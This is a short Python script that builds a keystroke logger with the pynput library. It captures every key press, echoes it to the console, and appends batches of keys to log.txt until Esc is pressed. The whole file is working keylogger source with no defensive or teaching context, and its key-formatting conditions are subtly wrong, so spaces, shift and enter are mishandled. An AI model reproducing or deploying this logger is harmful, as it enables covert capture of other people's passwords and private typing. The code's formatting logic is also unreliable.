
from pynput.keyboard import Key, Listener

count = 0
keys = []


def onPress(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        writeToFile(keys)
        keys = []


def writeToFile(keys):
    # for i in range(len(keys)):
    #     if keys[i] == "Key.backspace":
    #         keys.pop(i)
    #         keys.pop(i-1)

    with open("log.txt", "a") as f:

        for key in keys:

            # k = str(key)
            # print(key, " Write")

            if str(key).find("Key.space") > 0:
                f.write(" ")

            elif str(key).find("Key.shift") != 0:
                f.write(str(key))

            elif str(key).find("Key.enter") != 0:
                f.write("\n")


def onRelease(key):
    global keys

    if key == Key.esc:

        writeToFile(keys)
        return False


with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()
